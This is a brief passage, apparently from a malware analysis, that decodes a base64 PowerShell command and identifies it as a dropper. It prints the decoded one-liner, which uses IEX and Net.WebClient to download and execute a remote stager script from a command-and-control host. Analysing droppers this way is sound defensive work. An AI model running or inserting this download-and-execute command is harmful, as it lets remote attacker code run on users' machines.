### Decoded PowerShell Command
The base64 encoded command decodes to:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
```
This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.
